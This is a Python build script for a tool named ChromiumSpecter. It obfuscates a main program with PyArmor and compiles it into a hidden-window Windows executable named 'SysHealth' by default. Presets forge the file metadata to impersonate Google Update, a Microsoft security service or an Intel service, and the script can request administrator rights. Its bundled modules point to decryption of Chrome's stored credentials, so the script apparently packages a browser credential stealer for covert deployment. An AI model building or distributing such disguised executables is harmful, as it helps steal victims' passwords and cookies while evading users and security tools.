# 🛡️ ChromiumSpecter — Tactical Auditor Suite
# Copyright (C) 2026 ANONIMO432HZ
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://fsf.org/licenses/>.

import os
import sys
import subprocess
import argparse
import tempfile

__version__ = "1.2.1"  # Updated build suite version

def get_python_executable():
    return sys.executable

def run_command(cmd_list, description="Running command"):
    print(f"\n[*] {description}...")
    # print(f"Executing: {' '.join(cmd_list)}") # Opcional: para depuración
    try:
        proc = subprocess.Popen(
            cmd_list,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            bufsize=1,  # Line buffered
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        
        full_output = []
        for line in proc.stdout:
            print(line, end='', flush=True)
            full_output.append(line)
        
        proc.wait()
        if proc.returncode == 0:
            print("[+] Success.")
            return True, "".join(full_output)
        else:
            print(f"[-] Error: Process exited with code {proc.returncode}")
            return False, "".join(full_output)
            
    except Exception as e:
        print(f"[-] Exception: {e}")
        return False, str(e)

def create_version_file(args):
    """Genera un archivo de version temporal para PyInstaller."""
    v = args.version.replace('.', ',')
    if v.count(',') < 3:
        v += ",0" * (3 - v.count(','))
    
    content = f"""
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({v}),
    prodvers=({v}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        '040904B0',
        [StringStruct('CompanyName', '{args.company}'),
        StringStruct('FileDescription', '{args.desc}'),
        StringStruct('FileVersion', '{args.version}'),
        StringStruct('InternalName', '{args.name}'),
        StringStruct('LegalCopyright', '{args.copyright}'),
        StringStruct('OriginalFilename', '{args.name}.exe'),
        StringStruct('ProductName', '{args.product}'),
        StringStruct('ProductVersion', '{args.version}')])
      ]), 
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"""
    fd, path = tempfile.mkstemp(suffix=".txt", text=True)
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        f.write(content)
    return path

def get_dynamic_imports():
    """Analiza requirements.txt y main.py y devuelve lista de modulos para PyInstaller."""
    translation = {
        "pycryptodomex": "Cryptodome",
        "pywin32": "win32crypt",
        "pillow": "PIL",
        "pyinstaller": "PyInstaller"
    }
    # Dependencias core necesarias para el Builder autónomo y módulos internos dinámicos
    hidden = ["pyarmor.cli", "modules.chrome_v20_decryption.v20_decryptor"]
    
    # 1. Parsear dependencias estándar desde main.py
    import re
    if os.path.exists("main.py"):
        with open("main.py", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("import "):
                    hidden.extend(line.replace("import ", "").split(","))
                elif line.startswith("from "):
                    match = re.match(r"^from\s+([a-zA-Z0-9_.]+)\s+import", line)
                    if match:
                        hidden.append(match.group(1))
    
    # Limpiar espacios en los imports extraídos de main.py
    hidden = [h.strip() for h in hidden if h.strip()]

    # 2. Parsear dependencias externas desde requirements.txt
    try:
        if os.path.exists("requirements.txt"):
            with open("requirements.txt", "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"): continue
                    # Extraer solo el nombre del paquete omitiendo versiones
                    import re
                    pkg = re.split(r'[>=<~]', line)[0].strip().lower()
                    if pkg in ["pytest", "pytest-mock", "pytest-cov"]: continue
                    hidden.append(translation.get(pkg, pkg))
    except Exception as e:
        print(f"[-] Advertencia: No se pudo parsear requirements.txt: {e}")
    
    return list(set(hidden))

def main():
    parser = argparse.ArgumentParser(
        description="Suite de Ofuscación y Compilación Robusta (Build Suite)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python build.py --name "MiApp" --icon "app.ico"
  python build.py --no-obf --onefile
  python build.py --noconsole --dist-dir "./bin"
        """
    )
    
    parser.add_argument("input", nargs="?", default="main.py", 
                        help="Archivo .py principal a compilar (defecto: 'main.py').")
    
    comp_group = parser.add_argument_group("Opciones de Compilación (PyInstaller)")
    comp_group.add_argument("--name", default="SysHealth", 
                            help="Nombre deseado para el archivo ejecutable (defecto: 'SysHealth').")
    comp_group.add_argument("--multi-file", action="store_true", 
                            help="Crea una carpeta con múltiples archivos en lugar de un único .exe.")
    comp_group.add_argument("--show-console", action="store_true", 
                            help="Genera un 'Console App' (muestra la ventana de comandos). Si se desactiva, genera un 'Windowed App' (invisible).")
    comp_group.add_argument("--icon", default=None, 
                            help="Ruta a un archivo .ico para el icono del programa.")
    comp_group.add_argument("--dist-dir", default="dist", 
                            help="Carpeta de destino para el ejecutable final (defecto: 'dist').")

    comp_group.add_argument("--uac-admin", action="store_true", 
                            help="Solicita privilegios de administrador al ejecutar el EXE.")
    comp_group.add_argument("--clean", action="store_true", 
                            help="Limpia los archivos temporales después de la compilación.")
    comp_group.add_argument("--upx", default=None, 
                            help="Ruta al directorio de UPX para comprimir el ejecutable.")
    
    obf_group = parser.add_argument_group("Opciones de Ofuscación (PyArmor)")
    obf_group.add_argument("--no-obf", action="store_true", 
                           help="Desactiva la ofuscación de PyArmor y compila solo con PyInstaller vanilla.")
    
    meta_group = parser.add_argument_group("Identidad y Spoofing (Metadatos del EXE)")
    meta_group.add_argument("--preset", choices=["google", "microsoft", "intel"], default="google",
                            help="Aplica un perfil de metadatos predefinido para rapidez.")
    meta_group.add_argument("--company", help="Nombre de la empresa (ej: Microsoft).")
    meta_group.add_argument("--desc", help="Descripción del archivo.")
    meta_group.add_argument("--version", default="2.6.0.0", help="Versión del archivo (ej: 1.0.0.0).")
    meta_group.add_argument("--copyright", help="Copyright legal.")
    meta_group.add_argument("--product", help="Nombre del producto.")
    
    args = parser.parse_args()

    # Lógica de Presets
    presets = {
        "google": {
            "company": "Google LLC",
            "desc": "Google Update Setup",
            "product": "Google Update",
            "copyright": "Copyright Google LLC. All rights reserved."
        },
        "microsoft": {
            "company": "Microsoft Corporation",
            "desc": "Windows Security Health Service",
            "product": "Windows Operating System",
            "copyright": "© Microsoft Corporation. All rights reserved."
        },
        "intel": {
            "company": "Intel Corporation",
            "desc": "Intel(R) Content Protection Framework Service",
            "product": "Intel(R) Management Engine Components",
            "copyright": "Copyright (c) Intel Corporation."
        }
    }

    if args.preset in presets:
        p = presets[args.preset]
        if not args.company: args.company = p["company"]
        if not args.desc: args.desc = p["desc"]
        if not args.product: args.product = p["product"]
        if not args.copyright: args.copyright = p["copyright"]

    python = get_python_executable()

    if not os.path.exists("main.py"):
        print("[-] Error: main.py not found in current directory.")
        return

    if args.no_obf:
        print("[*] Performing vanilla PyInstaller build (No Obfuscation)...")
        # Check if PyInstaller is available
        v_check, _ = run_command([python, "-m", "PyInstaller", "--version"], "Verifying PyInstaller")
        if not v_check:
            print("[-] Error: PyInstaller is not installed. Run: pip install pyinstaller")
            return

        # Definir parámetros base
        onefile = not args.multi_file
        windowed = not args.show_console

        # Generar version file si es necesario
        v_file = create_version_file(args)

        pyi_cmd = [python, "-m", "PyInstaller", args.input]
        if onefile: pyi_cmd.append("--onefile")
        if windowed: pyi_cmd.append("--windowed")
        if args.uac_admin: pyi_cmd.append("--uac-admin")
        if args.clean: pyi_cmd.append("--clean")
        if args.upx and os.path.exists(args.upx):
            pyi_cmd.extend(["--upx-dir", args.upx])
        
        pyi_cmd.extend(["--version-file", v_file])
        
        # --- Universal Dependency Injection ---
        # Extraemos imports del requirements.txt dinámicamente
        hidden_imports = get_dynamic_imports()
        for imp in hidden_imports:
            pyi_cmd.extend(["--hidden-import", imp])
            
        if args.icon and os.path.exists(args.icon): pyi_cmd.extend(["--icon", args.icon])
        pyi_cmd.extend(["--name", args.name, "--distpath", args.dist_dir])
        
        run_command(pyi_cmd, f"Compilador Universal (Destino: {args.dist_dir})")
        os.unlink(v_file)
        # Proceder al final para cleanup

    else:
        # 1. Detect PyArmor version
        print("[*] Detecting PyArmor version...")
        success, version_out = run_command([python, "-m", "pyarmor.cli", "--version"], "Checking PyArmor CLI")
        
        if success:
            print("[+] PyArmor 8+ detectado.")
            onefile = not args.multi_file
            windowed = not args.show_console

            # --- Step 1: Obfuscate only (no --pack) ---
            obf_dir = os.path.join(args.dist_dir, "obfuscated_src")
            ok, _ = run_command(
                [python, "-m", "pyarmor.cli", "gen", "--output", obf_dir, args.input],
                "Ofuscando script con PyArmor 9"
            )
            if not ok:
                print("[-] Error en la ofuscación. Abortando.")
                return

            # PyArmor puts the obfuscated script + runtime in obf_dir
            obf_script = os.path.join(obf_dir, os.path.basename(args.input))
            if not os.path.exists(obf_script):
                print(f"[-] No se encontró el script ofuscado en: {obf_script}")
                return

            # --- Step 2: Run PyInstaller directly on the obfuscated output ---
            v_file = create_version_file(args)
            hidden_imports = get_dynamic_imports()

            pyi_cmd = [python, "-m", "PyInstaller", obf_script]
            pyi_cmd += ["--name", args.name]
            pyi_cmd += ["--distpath", args.dist_dir]
            # PyArmor runtime hook is in obf_dir
            pyi_cmd += ["--additional-hooks-dir", obf_dir]
            pyi_cmd += ["--version-file", v_file]

            if onefile:   pyi_cmd.append("--onefile")
            if windowed:  pyi_cmd.append("--windowed")
            if args.uac_admin: pyi_cmd.append("--uac-admin")
            if args.clean:     pyi_cmd.append("--clean")
            if args.upx and os.path.exists(args.upx):
                pyi_cmd += ["--upx-dir", args.upx]
            if args.icon and os.path.exists(args.icon):
                pyi_cmd += ["--icon", args.icon]

            for imp in hidden_imports:
                pyi_cmd += ["--hidden-import", imp]

            run_command(pyi_cmd, f"Compilando con PyInstaller (nombre: {args.name})")
            os.unlink(v_file)
        else:
            # Try legacy pyarmor
            print("[!] PyArmor 8+ CLI no encontrado. Probando modo Legacy...")
            success, version_out = run_command([python, "-m", "pyarmor", "--version"], "Verificando PyArmor Legacy")
            if success:
                print("[+] PyArmor 7.x detectado.")
                onefile = not args.multi_file
                windowed = not args.show_console
    
                pyi_opts = []
                if onefile: pyi_opts.append("--onefile")
                if windowed: pyi_opts.append("--windowed")
                pyi_opts.append(f"--name {args.name}")
                
                opts_str = " ".join(pyi_opts)
                run_command([python, "-m", "pyarmor", "pack", "-e", opts_str, args.input], "Compilando con PyArmor Legacy")
            else:
                print("[-] FATAL: PyArmor not found in environment. Please run: pip install pyarmor")

    print("\n[!] Proceso finalizado. Revisá la carpeta 'dist/' para ver los resultados.")
    cleanup_artifacts(args)

def cleanup_artifacts(args):
    """Limpia archivos temporales y artefactos de compilación."""
    print("\n[*] Limpiando artefactos de compilación...")
    
    # 1. El archivo .spec se genera con el nombre del ejecutable
    spec_file = f"{args.name}.spec"
    if os.path.exists(spec_file):
        try:
            os.unlink(spec_file)
            print(f"  [+] Archivo especificación eliminado: {spec_file}")
        except Exception as e:
            print(f"  [!] No se pudo eliminar {spec_file}: {e}")

    # 2. Si se solicitó limpieza, borramos la carpeta build/ que deja PyInstaller
    if args.clean and os.path.exists("build"):
        import shutil
        try:
            shutil.rmtree("build")
            print("  [+] Carpeta temporal 'build/' eliminada.")
        except Exception as e:
            print(f"  [!] No se pudo eliminar carpeta 'build/': {e}")

    # 3. Eliminar carpeta de fuentes ofuscadas (es temporal)
    obf_dir = os.path.join(args.dist_dir, "obfuscated_src")
    if os.path.exists(obf_dir):
        import shutil
        try:
            shutil.rmtree(obf_dir)
            print(f"  [+] Carpeta temporal de ofuscación eliminada: {obf_dir}")
        except Exception as e:
            print(f"  [!] No se pudo eliminar {obf_dir}: {e}")

if __name__ == "__main__":
    main()
